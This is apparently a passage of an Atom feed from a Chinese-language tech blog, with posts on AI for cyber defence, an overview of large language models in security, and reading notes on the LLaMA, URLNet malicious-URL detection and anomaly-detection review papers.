在网络安全中的关键作用</h3><p>网络空间安全相关的数据体量大、数据种类多、数据增长快，传统的分析技术在处理此类数据时效率低、准确率低。人工智能在处理海量数据、多源数据、动态数据等方面具有显著的优势，能助力于网络空间安全，提升网络防御能力。</p><ul><li>海量数据的快速处理能力：网络空间安全相关的数据体量大，例如系统中保存的日志数据、网络流量数据等，处理如此海量的数据既需要庞大的算力支撑，也需要能处理如此海量数据的智能算法。由于人工智能技术能从海量数据中学习数据的特征，根据特征再对数据进行分类、聚类等处理，能大幅度提升效率和准确度。</li><li>多源异构数据的高效关联能力：网络安全相关的数据种类繁多、来源广泛，如通过传感器、网络爬虫、日志收集系统等能采集到不同类型的数据，从来源上数据类型可以分为环境业务数据、网络层数据、日志层数据、告警数据等类别，综合不同来源的异构数据进行综合分析能提升网络空间主动防御能力。</li><li>动态数据的实时在线处理能力：网络空间安全相关的数据增长速度快，时效性要求高。专家系统的缺陷在于专家知识更新慢，利用专家系统能快速检测已知的网络攻击，但是对于未知的网络攻击事件，专家系统的知识往往由于更新不及时，导致系统无法正确检测。此时，需要结合人工智能技术赋予的预测能力，对动态的数据设计在线算法，能够结合已有的网络安全知识和实时的数据判断当前的潜在网络攻击；根据已经发生的攻击事件和历史数据，建立攻击预测模型，预测未来可能发生的攻击行为，通过人工智能技术增强系统的预测能力，提供动态防御能力，提升网络安全事件的快速响应能力。</li></ul><h3 id="提出行动和解决方案"><a href="#提出行动和解决方案" class="headerlink" title="提出行动和解决方案"></a>提出行动和解决方案</h3><p>构建动态可扩展的网络安全知识大脑</p><ul><li>充分利用人工智能技术在处理海量数据、多源异构数据、实时动态数据等方面的显著优势，构建动态可扩展的网络安全知识大脑，提升网络空间防御能力。</li><li>具体而言，针对网络安全知识描述中多实体、弱关系、时空复杂性和多来源等特点，对于结构化、半结构化和非结构化的数据，基于 MDATA 知识表示模型、网络安全知识语料库中的特定表达和网络安全知识之间特有的逻辑关系和对应关系，构建相应的网络安全本体模型，实现多领域知识的统一表示，相较于传统的知识图谱等知识表示模型，可提升融合效率和多领域动态知识统一表示的准确率。</li><li>在此基础上，针对半结构化数据和非结构化数据知识抽取难的问题，基于构建的本体模型，结合双向循环神经网络和条件随机场等深度学习方法，进行特征抽取、联合标记、类别标记等。对于未被识别出的本体进行人工抽取，从而确保基于本体模型生成的三元组知识在逻辑上是正确的，实现动态可扩展的网络安全知识大脑，为网络安全防御提供强大的具有自学习能力的知识库支撑。</li></ul><p>推动有效网络攻击的智能化检测</p><ul><li>针对网络攻击越来越智能化，大规模网络攻击越来越频繁，网络攻击的隐蔽性越来越高的特点，遵循网络攻击的基本规律，基于构建的网络安全知识库，实现复杂网络攻击的智能化检测算法。可将网络安全事件和攻击的基本信息存储于安全知识图谱中，通过采集数据与安全知识图谱进行匹配，根据状态的触发约束，可分析得到网络系统中的单步攻击和复合攻击。</li><li>一般而言，检测复合攻击时可以分析出攻击的当前阶段，无法确保输出完整攻击链，因此可进一步基于攻击规则库的复合攻击研判技术，将先验知识存入网络安全知识图谱和复合攻击规则库，基于大数据分析平台，通过采集数据与安全知识图谱进行匹配，再经过时空属性和复合攻击规则库的共同约束，从海量的数据中挖掘出有效的攻击链，并完善复合攻击的攻击链，实现自动化分析攻击目的和意图等。针对传统方法无法应对输入的数据中误报和漏报的情况，可以基于多模态数据的复合攻击研判，当输入的数据中存在误报和漏报的情况时，可以自动补全缺失的信息，并计算生成不同攻击链的概率，消除误报和漏报的影响。进一步，可通过网络仿真平台对攻击事件进行仿真，将分析结果与仿真攻击的信息进行对比，实现对有效网络攻击的智能研判。</li></ul><p>评估人工智能技术的安全性，推动人工智能技术的良性应用</p><ul><li>在制定人工智能的发展路线的同时应该要紧盯风险防御，加强对潜在风险的预判和研究，注重系统安全防御技术的发展，明确防御发展策略。</li><li>同时，应加强人工智能风险管理。人工智能自身存在的漏洞和人工智能技术的滥用是系统安全防御中很难避免的环节。自身存在的安全风险属于最致命的问题，应用越广泛，其带来的危害性也越大。系统安全防御技术要从人工智能技术自身入手，构建主动免疫的计算构架，尽可能地降低技术自身的漏洞危害，不断创新保持技术优势。</li></ul><h3 id="鼓励合作与跨界合作的重要性"><a href="#鼓励合作与跨界合作的重要性" class="headerlink" title="鼓励合作与跨界合作的重要性"></a>鼓励合作与跨界合作的重要性</h3><p>人工智能最重要的因素是数据，然而受限于隐私和数据安全，注定了网络安全领域的数据难以共享，无法建立统一的数据集或语料库。单靠某一家安全公司或企业难以实现宏大的目标，所以需要有着完善及合作机制，甚至是实现跨界合作，集万家之所长。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;本文论题为《智能防线：AI 驱动的网络空间防御体系》，主要从人工智能在网络空间安全智能防御体系中的现状、挑战、机遇与应用前景等方面综合阐述 AI + 智能防御的理念。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="IA" scheme="https://coldwave96.github.io/tags/IA/"/>
    
    <category term="GenAI" scheme="https://coldwave96.github.io/tags/GenAI/"/>
    
  </entry>
  
  <entry>
    <title>Large Language Model (LLM) 漫谈</title>
    <link href="https://coldwave96.github.io/2023/06/28/LLM/"/>
    <id>https://coldwave96.github.io/2023/06/28/LLM/</id>
    <published>2023-06-28T07:53:28.000Z</published>
    <updated>2023-06-28T07:53:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从 ChatGPT 上线以来，LLM (Large Language Model) 的热潮席卷了各行各业。Meta 开源的 LLaMA 模型给头部玩家进入这一领域提供了导航，Standford Alpaca 和 Microsoft LoRA 给小玩家们提供了低成本的玩法，总之只要想玩，人人可上手（PS. 老黄真的是秦始皇吃花椒 - 赢麻了，前有矿潮，后有AI，臭打游戏的能有几个钱，无足挂齿）。LLM 从刚开始的通用模型，到现在各个行业都在考虑垂直领域中的应用，网络安全领域当然也不例外。</p><span id="more"></span><h2 id="发展背景"><a href="#发展背景" class="headerlink" title="发展背景"></a>发展背景</h2><p>LLM 的崛起主要取决于3方面的因素：数据，算力，算法。</p><p>首先是数据方面，在信息爆炸的年代，加上元宇宙， WEB3 等概念的加持，数据上云，全民共享成为了时代的主流。在线社交网络，万物互联的物联网，移动互联网都为 LLM 提供了丰富的语料数据，Github 等代码托管平台提供了丰富的高质量代码数据……</p><p>然后是算力方面，归功于半导体行业的产业迭代带来的硬件支持，以及 NVIDIA 开启的 GPU 加速时代，老黄不遗余力发展的 CUDA，cuDNN 等配套软件支持。TensorFlow，Pytorch 为代表的 AI 框架降低了这一领域的门槛，同时也拉高了上限，以及 DeepSpeed 等并行计算框架带来的算力的成倍增长。</p><p>最后是算法方面，深度学习算法的迭代更新速度飞快，以 Transformer 为代表的算法框架逐渐突破了原来对深度网络结构的限制。</p><p>总之，现在的 LLM 崛起是量变引起质变的过程。</p><h2 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h2><p>2017年由 Google 团队提出的 Transformer 模型，是目前所有大语言模型的基础架构。</p><p>Attention is All You Need：<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p><center>    <img src="/img/LLM/LLM1.png" width="850"></center><p>图中最右边的结构是论文中 Transformer 的内部结构图，左侧为 Encoder block，右侧为 Decoder block，Encoder 和 Decoder 都包含 6 个 block。红色圈中的部分为 Multi-Head Attention，是由多个 Self-Attention组成的，可以看到 Encoder block 包含一个 Multi-Head Attention，而 Decoder block 包含两个 Multi-Head Attention (其中有一个用到 Masked)。Multi-Head Attention 上方还包括一个 Add &amp; Norm 层，Add 表示残差连接 (Residual Connection) 用于防止网络退化，Norm 表示 Layer Normalization，用于对每一层的激活值进行归一化。</p><p>图中最左边是 Self-Attention 的结构，在计算的时候需要用到矩阵Q(查询),K(键值),V(值)。在实际中，Self-Attention 接收的是输入(单词的表示向量x组成的矩阵X) 或者上一个 Encoder block 的输出。而Q,K,V正是通过 Self-Attention 的输入进行线性变换得到的。</p><p>图中左二 Multi-Head Attention 是由多个 Self-Attention 组合形成。</p><p>关于 Transformer 的更多细节介绍参考<a href="https://zhuanlan.zhihu.com/p/338817680">这里</a>。</p><center>    <img src="/img/LLM/LLM2.png" width="850"></center><p>GPT 和 BERT都是基于 Transformer 的与训练语言模型，都是通过“预训练+微调”的模式完成下游任务的搭建。GPT是单向模型，只利用上文信息推断下文，而BERT是双向模型。GPT 基于自回归模型，可完成 NLU（Natural Language Understanding）和 NLG（Natural Language Generation）任务。原生 BERT 基于自编码模型，无法直接应用于文本生成任务。</p><h2 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h2><center>    <img src="/img/LLM/LLM3.png" width="850"></center> <p>LLM 的发展经历了多年的积累，从单纯的 NLP 任务转变成为现在的多模态模型，也引申出了 Prompt 工程的概念，涉及到 AI Ethics 的内容也逐渐被重视。随着大语言模型的逐渐开源化和社区化，未来一定是越来越好的。</p><h2 id="垂直领域"><a href="#垂直领域" class="headerlink" title="垂直领域"></a>垂直领域</h2><p>LLM 带来的变革深入各个产业，于是垂直领域的 LLM 越来越成为焦点。但是这里面临的主要问题是数据源，各个垂直领域有关数据的开放程度不尽相同。以网络安全领域为例，各家的安全数据不仅不可能共享，甚至公司内部也权限森明，导致了安全领域的 LLM 必然面临着数据源不充足的问题。</p><p>与此同时，LLM 对安全领域带来的冲击也是巨大的。</p><p>对于攻击方来说，攻击手段更为普及，高级攻击手段的门槛降低。通过 LLM 可以快速生成各种各样的高级混淆手段，定向的钓鱼邮件，钓鱼页面也可以通过 LLM 快速定制。攻击方的攻击速度也大大提升，绕过手法可以快速迭代，漏洞利用代码也能快速开发，1 Day 可能真的就是物理意义上的“1 Day”。</p><p>然而与之相对的防守方，LLM 加剧了与攻击方人员的能力、知识、技术的不对等，无法面对高级攻击常态化的趋势。防守方传统的防守手段高度依赖高水平的安全人员，然而现状却是安全人员的长期缺乏。同时防守方的自动化能力不足，迫切的需要机器对抗机器的手段。</p><h2 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>想要构建一个大语言模型，首先第一步是要预训练出一个初步的 NLP 模型，目的是通过给定的 Token， 能够预测下一个 Token。</p><center>    <img src="/img/LLM/LLM4.png" width="850"></center><p>具体方式通过计算模型预测的下一个单词与真实的下一个单词之间的误差，通过算法获取降低误差的梯度，传播梯度更新模型参数。</p><center>    <img src="/img/LLM/LLM5.png" width="850">    <img src="/img/LLM/LLM6.png" width="850"></center><p>第二步是微调 Fine-Tune， 收集特定领域的数据，由该领域额专家对这些数据进行精心标注，通过上一步类似的训练手段，进一步更新模型的参数权重。</p><center>    <img src="/img/LLM/LLM7-1.png" width="850">    <img src="/img/LLM/LLM7-2.png" width="850"></center><p>微调完成之后的模型就已经有了不错的变表现，可以部署推理了。输入一个句子，预测每个单词出现的频率，将频率最大的作为输出，循环往复，直到遇到终止符。</p><center>    <img src="/img/LLM/LLM8.png" width="850"></center><h3 id="训练流程"><a href="#训练流程" class="headerlink" title="训练流程"></a>训练流程</h3><p>一个完整 LLM 构建流程其实包含4步，除了前面说的预训练和微调之后，还需要通过奖励模型以及强化学习的手段进一步加强模型的能力。</p><center>    <img src="/img/LLM/LLM9.png" width="850"></center><h2 id="建设方案"><a href="#建设方案" class="headerlink" title="建设方案"></a>建设方案</h2><h3 id="二次复现"><a href="#二次复现" class="headerlink" title="二次复现"></a>二次复现</h3><p> Meta 放出的 LLaMA 模型基本做到了全开源，根据<a href="http://arxiv.org/abs/2302.13971">论文</a>中的信息，LLaMA 的全部数据源均可获取，训练模型的超参数也基本公布，在模型结构上做的调整也详细列出，这就意味着 LLaMA 的结果完全可以复刻。</p><center>    <img src="/img/LLM/LLM10.png" width="850">    <img src="/img/LLM/LLM11.png" width="850">    <img src="/img/LLM/LLM12.png" width="850"></center><h3 id="权重微调"><a href="#权重微调" class="headerlink" title="权重微调"></a>权重微调</h3><p>对于财力和实力不够的玩家来说，微调是另一个可行的建设方案，无论是基于 LLaMA 还是 THUDM&#x2F;GLM 模型的微调都能够在垂直领域有一定的效果。但是考虑到数据、基础语料以及模型权重的 License 等问题，想要有非常好的效果也是不现实的。</p><p>微调的方式目前有很多，比如 <a href="https://github.com/tatsu-lab/stanford_alpaca">Stanford Alpaca</a>、<a href="https://github.com/tloen/alpaca-lora">LoRA</a>、<a href="https://github.com/THUDM/P-tuning-v2">P-Tuning v2</a> 等。</p><center>    <img src="/img/LLM/LLM13.png" width="850">    <img src="/img/LLM/LLM14.png" width="850"></center><h2 id="研究进展"><a href="#研究进展" class="headerlink" title="研究进展"></a>研究进展</h2><h3 id="项目推进"><a href="#项目推进" class="headerlink" title="项目推进"></a>项目推进</h3><p>目前在推进的是 LLM 在安全领域的应用，覆盖两种建设方案。在权重微调方面，基于 LLaMA 模型，结合蜜罐数据，尝试将大语言模型作为蜜罐后台，模拟服务端的返回。此外也在尝试通过安全专家标注的网络攻击数据，训练 LLM 对网络攻击的检测能力，并提供判断思路。</p><p>由于目前开放的大模型都涉及到 License 问题，研究学习当然没问题，一旦从产品的角度考虑商用，就会收到权重的限制。所以需要重新进行预训练，调整模型的全部权重，其实也就是在做复现 LLaMA 的工作。</p><p>LangChain + LLM 的思路也很值得尝试。通过 LangChain 将本地的大量的威胁情报和 LLM 结合，制作本地知识库也是目前推动的方向。</p><h3 id="发展方向"><a href="#发展方向" class="headerlink" title="发展方向"></a>发展方向</h3><p>除了 Prompt 工程以外，培养模型的链式思维（Chain of Thoughts）也是热门方向。链式思维主要是培养模型的 Zero-Shot 能力，对于安全领域来说，这一方向的意义在于希望 LLM 能够在无样本的情况下检测 0 Day 攻击。</p><center>    <img src="/img/LLM/LLM15.png" width="850"></center><p>安全领域的 LLM 整体解决方案目前看来有两种。一种是将 LLM 作为分析中台，所有的数据通过 LLM 进行分析，通过其开放的 API 接口获取结果。另一种是将 LLM 作为调度中台以及人机交互接口，所有的安全数据由 LLM 调度分发，通过更简单快捷的小模型及其他分析引擎处理分析，分析结果整合成为一个统一的数据格式交由 LLM 与用户沟通，用更简单通俗的自然语言充当一个安全专家的形象。</p><p>虽然目前 LLM 还有很多问题，但是起码让我们看到了它的潜力，希望这是黎明前的那道曙光，身前一片坦途。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;自从 ChatGPT 上线以来，LLM (Large Language Model) 的热潮席卷了各行各业。Meta 开源的 LLaMA 模型给头部玩家进入这一领域提供了导航，Standford Alpaca 和 Microsoft LoRA 给小玩家们提供了低成本的玩法，总之只要想玩，人人可上手（PS. 老黄真的是秦始皇吃花椒 - 赢麻了，前有矿潮，后有AI，臭打游戏的能有几个钱，无足挂齿）。LLM 从刚开始的通用模型，到现在各个行业都在考虑垂直领域中的应用，网络安全领域当然也不例外。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>LLaMA - Open and Efficient Foundation Language Models</title>
    <link href="https://coldwave96.github.io/2023/03/28/LLaMA/"/>
    <id>https://coldwave96.github.io/2023/03/28/LLaMA/</id>
    <published>2023-03-28T05:27:39.000Z</published>
    <updated>2023-03-28T05:27:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：LLaMA: Open and Efficient Foundation Language Models</li><li>作者：Hugo Touvron, Thibaut Lavril, Gautier Izacard, Xavier Martinet Marie-Anne Lachaux, Timothee Lacroix, Baptiste Rozière, Naman Goyal Eric Hambro, Faisal Azhar, Aurelien Rodriguez, Armand Joulin Edouard Grave, Guillaume Lample - Meta AI</li><li>原文链接：<a href="http://arxiv.org/abs/2302.13971">LLaMA: Open and Efficient Foundation Language Models</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>训练了一系列的语言模型在不同的推断预算上实现最佳表现，模型参数从7B到65B不等。其中，13B模型大多数 benchmarks 表现超越 GPT-3，规模只有 GPT-3 的十分之一。65B模型能够和最大最好的语言模型 Chinchilla 或 PaLM-540B 竞争。</li><li>65B模型在2048张A100（80GB RAM）的集群，包含1.4T tokens的数据集情况下，训练时间为约为21天。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>通过多头注意力（Multi-head attention）机制减少内存使用以及运行时间。具体实现为不存储 attention 权重，不计算 key&#x2F;query 的分数。</li><li>为了提升训练效率，减少了 backword pass 过程中重新计算 avtivations 的数量。更准确的说，保存了很难计算的 activations，比如线性层的输出。实际是通过手动实现 transformer 层的 backward 功能函数，而不是依赖于 PyTorch 提供的 autograd 方法。</li><li>尽可能多的重叠 activations 以及 GPU 之间通过网络的交流两部分产生计算（通过 all_reduce 操作）。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><h3 id="Pre-training-Data"><a href="#Pre-training-Data" class="headerlink" title="Pre-training Data"></a>Pre-training Data</h3><ul><li>English CommonCrawl：通过 fastText 线性分类器预处理了 CCNet pipeline【1】获取的数据，去除了非英语页面，并通过一个 n-gram 语言模型过滤掉了低质量内容。</li><li>C4：公开可获取的数据集，同样包含去重和语言识别等预处理过程。</li><li>Github：在 Google BigQuery 上可公开获取的公共 Github 数据集。</li><li>Wikipedia：覆盖20种语言，去除了超链接，评论和其他格式化的内容。</li><li>Gutenberg and Books3：从书籍层面去重，转化为数据集。</li><li>ArXiv：去除第一节之前的部分，引用，评论，行内扩展的定义等作为科研类数据集。</li><li>Stack Exchange：高质量的问答类数据，覆盖多元领域。</li></ul><center>    <img src="/img/LLaMA/1.png" width="850"></center><p>分词器（Tokenizer）基于 bytepair encoding（BPE）算法【2】，具体实现参考 SentencePiece【3】。处理完成之后，整体数据集大约包含1.4T tokens。除了 Wikipedia 和 Books 的数据运行了大约 2 轮之外，其他数据只使用一次。</p><h3 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h3><ul><li>神经网络基于 transformer architecture【4】，改进点如下：<ul><li>Pre-normalization [GPT3]：每一个 transformer sub-layer，通过 RMSNorm 归一化函数【5】归一化输入而不是输出。</li><li>SwiGLU activation function [PaLM]：用 SwiGLU 激活函数【6】替换 ReLU。PaLM 中维度数据使用（2&#x2F;3）4d而非4d。</li><li>Rotary Embeddings [GPTNeo]：移除绝对位置嵌入（absolute positional embeddings），加入 rotary positional embeddings（RoPE）【7】。</li></ul></li></ul><h3 id="Optimizer"><a href="#Optimizer" class="headerlink" title="Optimizer"></a>Optimizer</h3><ul><li>Optimizer 使用 the AdamW optimizer【8】，超参数 β1 &#x3D; 0.9，β2 &#x3D; 0.95。最终学习速率是最大学习速率的10%。weight decay 为 0.1，gradient clipping 为 1.0，warmup steps 为 2000。</li><li>优化的具体实现可通过 <a href="https://github.com/facebookresearch/xformers">xformers库</a>。</li></ul><center>    <img src="/img/LLaMA/2.png" width="850"></center><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>以更小的模型体积实现更好的性能，降低了大语言模型实用场景的门槛。</li><li>技术特点均有提及，训练集均可获得，过程复现的可能性大，但仍需要进一步研究。</li><li>Finetuning 的过程及技术未提及。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><p>Guillaume Wenzek, Marie-Anne Lachaux, Alexis Conneau, Vishrav Chaudhary, Francisco Guzmán, Armand Joulin, and Edouard Grave. 2020. CCNet: Extracting high quality monolingual datasets from web crawl data. In Language Resources and Evaluation Conference.</p><p> <a href="https://aclanthology.org/2020.lrec-1.494/">CCNet: Extracting High Quality Monolingual Datasets from Web Crawl Data</a></p></li><li><p>Rico Sennrich, Barry Haddow, and Alexandra Birch. 2015. Neural machine translation of rare words with subword units. arXiv preprint arXiv:1508.07909.</p><p> <a href="https://arxiv.org/abs/1508.07909">Neural Machine Translation of Rare Words with Subword Units</a></p></li><li><p>Taku Kudo and John Richardson. 2018. Sentencepiece: A simple and language independent subword tokenizer and detokenizer for neural text processing. arXiv preprint arXiv:1808.06226.</p><p> <a href="https://arxiv.org/abs/1808.06226">SentencePiece: A simple and language independent subword tokenizer…</a></p></li><li><p>Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N Gomez, Ł ukasz Kaiser, and Illia Polosukhin. 2017. Attention is all you need. In Advances in Neural Information Processing Systems 30, pages 5998–6008.</p><p> <a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p></li><li><p>Biao Zhang and Rico Sennrich. 2019. Root mean square layer normalization. Advances in Neural Information Processing Systems, 32.</p><p> <a href="https://arxiv.org/abs/1910.07467">Root Mean Square Layer Normalization</a></p></li><li><p>Noam Shazeer. 2020. Glu variants improve transformer. arXiv preprint arXiv:2002.05202.</p><p> <a href="https://arxiv.org/abs/2002.05202">GLU Variants Improve Transformer</a></p></li><li><p>Jianlin Su, Yu Lu, Shengfeng Pan, Ahmed Murtadha, Bo Wen, and Yunfeng Liu. 2021. Roformer: Enhanced transformer with rotary position embedding. arXiv preprint arXiv:2104.09864.</p><p> <a href="https://arxiv.org/abs/2104.09864">RoFormer: Enhanced Transformer with Rotary Position Embedding</a></p></li><li><p>lya Loshchilov and Frank Hutter. 2017. Decoupled weight decay regularization. arXiv preprint arXiv:1711.05101.</p><p> <a href="https://arxiv.org/abs/1711.05101">Decoupled Weight Decay Regularization</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：LLaMA: Open and Efficient Foundation Language Models&lt;/li&gt;
&lt;li&gt;作者：Hugo Touvron, Thibaut Lavril, Gautier Izacard, Xavier Martinet Marie-Anne Lachaux, Timothee Lacroix, Baptiste Rozière, Naman Goyal Eric Hambro, Faisal Azhar, Aurelien Rodriguez, Armand Joulin Edouard Grave, Guillaume Lample - Meta AI&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;http://arxiv.org/abs/2302.13971&quot;&gt;LLaMA: Open and Efficient Foundation Language Models&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>URLNet - Learning a URL Representation with Deep Learning for Malicious URL Detection</title>
    <link href="https://coldwave96.github.io/2023/03/23/URLNet/"/>
    <id>https://coldwave96.github.io/2023/03/23/URLNet/</id>
    <published>2023-03-23T03:57:10.000Z</published>
    <updated>2023-03-23T03:57:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：URLNet: Learning a URL Representation with Deep Learning for Malicious URL Detection</li><li>作者：Hung Le, Quang Pham, Doyen Sahoo, Steven C.H. Hoi</li><li>原文链接：<a href="https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#225ae0a525f64fa8b9d0fdf24a921202">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>传统的恶意Url检测局限于黑名单，导致难以快速反应，同时无法检测不在黑名单中的未知恶意Url。</li><li>为了解决传统黑名单检测带来的滞后性，机器学习算法的介入提供了全新的方向。但是传统的机器学习算法依赖于特征提取技术。目前词袋模型作为最常用的语义特征提取技术，在面对恶意Url检测时存在许多挑战。比如难以准确的截取极具特征的字符串片段，无法学习到未知特征等。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>论文提出了基于深度学习的恶意Url检测方案URLNet，从字符以及词两种维度分别进行表示，通过CNN网络训练学习，最后结合两种种维度的特征获取结果。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><ul><li>样本中的URL统一只保留前200个字节，多余的部分截断，不足的部分用<PAD>填充。<center>  <img src="/img/URLNet/1.png" width="850"></center><center>  <img src="/img/URLNet/2.png" width="850"></center></li><li>特征提取<ul><li>Whole URL BoW<ul><li>Bag of Words</li><li>独特词的数量</li></ul></li><li>URL Component Tokenisation (UCT)。将URL分成主域名，路径，最终路径标识，最顶层域名。对每个部分分别建立BoW字典。</li><li>Position Sensitive &amp; Bigrams (PSB)。特殊字符如域名和路径会被提取出来组成大的字符，同时标记其相对位置。</li><li>Character Trigrams。通过3个字符大小的滑动窗口处理URL中的域名生成新的tokens。</li><li>其他统计学特征：URL长度，hostname长度，URL中点的个数等。这些特征由具备专业知识的人员设计。</li></ul></li></ul><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>文章提出了一种全新的基于语义的深度学习恶意Url检测模型，提供了从单个字符及单个词两种角度结合的分析视角，值得借鉴。</li><li>在从词的角度进行分析的网络中，论文在传统词袋模型之外提出了一些新的特征处理方法，并通过实验结果验证了有效性。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#face0efdfdb3455a9c1b48d6122295f9">Aaron Blum, Brad Wardman, Thamar Solorio, and Gary Warner. 2010. Lexical feature based phishing URL detection using online learning. In Proceedings of the 3rd ACM Workshop on Artificial Intelligence and Security. ACM, 54–60.</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li><a href="https://github.com/Antimalweb/URLNet">URLNet</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：URLNet: Learning a URL Representation with Deep Learning for Malicious URL Detection&lt;/li&gt;
&lt;li&gt;作者：Hung Le, Quang Pham, Doyen Sahoo, Steven C.H. Hoi&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#225ae0a525f64fa8b9d0fdf24a921202&quot;&gt;arxiv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="Deep Learning" scheme="https://coldwave96.github.io/tags/Deep-Learning/"/>
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>Deep Learning for Anomaly Detection - A Review</title>
    <link href="https://coldwave96.github.io/2023/03/21/DLforAD/"/>
    <id>https://coldwave96.github.io/2023/03/21/DLforAD/</id>
    <published>2023-03-21T05:36:58.000Z</published>
    <updated>2023-03-21T05:36:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：Deep Learning for Anomaly Detection: A Review</li><li>作者：<ul><li>GUANSONG PANG, University of Adelaide</li><li>CHUNHUA SHEN, University of Adelaide</li><li>LONGBING CAO, University of Technology Sydney</li><li>ANTON VAN DEN HENGEL, University of Adelaide</li></ul></li><li>原文链接：<a href="https://arxiv.org/abs/2007.02500">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>异常检测（Anomaly &#x2F; Outlier &#x2F; Novelty detection）在过去的几十年里都是热门研究话题，但是仍然存在许多复杂的问题和挑战需要更进一步的研究。</li><li>这篇论文主要介绍了基于深度学习的异常检测技术，涵盖了3大类，11个小类的理论方法。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>问题本质和挑战。作者提到了异常检测中遇到的特殊问题的复杂度以及由此造成的许多未解决的挑战。</li><li>问题分类和总结。本文将现有的深度学习异常检测方法归总为3中理论框架：深度学习普遍特征提取，正常样本的表示，端到端异常分数学习。所有的方法从11个不同的建模层面进行的分类。</li><li>深度解析其他的论文研究内容。</li><li>未来的机遇与挑战。</li><li>源代码及数据集。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" 